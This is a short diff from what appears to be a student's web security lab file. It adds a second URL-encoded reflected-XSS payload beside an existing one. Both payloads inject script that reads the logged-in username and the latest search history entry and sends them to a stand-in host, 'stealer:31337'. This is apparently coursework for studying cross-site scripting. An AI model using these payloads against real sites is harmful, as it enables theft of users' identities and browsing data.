@@ -12,3 +12,5 @@ You can reach me further with my student email: pmc8@gatech.edu
 
 
 &q=%3Cscript%3E%24(document).ready(function%20()%20%7B%24.get(%27http%3A%2F%2Fstealer%3A31337%2F%3Fstolen_user%3D%27%2Bdocument.getElementById(%27logged-in-user%27).innerHTML%2B%27%26last_search%3D%27%2Bdocument.getElementById(%27history-list%27).children%5B1%5D.text)%3B%7D)%3B%3C%2Fscript%3E
+
+&q=%3Cscript%3Edocument.addEventListener%28%22DOMContentLoaded%22%2C%20function%28%29%20%7Bvar%20username%3DencodeURIComponent%28document.getElementById%28%27logged-in-user%27%29.innerText%29%3Bvar%20lastSearch%3DencodeURIComponent%28document.getElementById%28%27history-list%27%29.children%5B1%5D.innerText%29%3Bnew%20Image%28%29.src%3D%22http%3A%2F%2Fstealer%3A31337%2F%3Fstolen_user%3D%22%2Busername%2B%22%26last_search%3D%22%2BlastSearch%3B%7D%29%3B%3C%2Fscript%3E
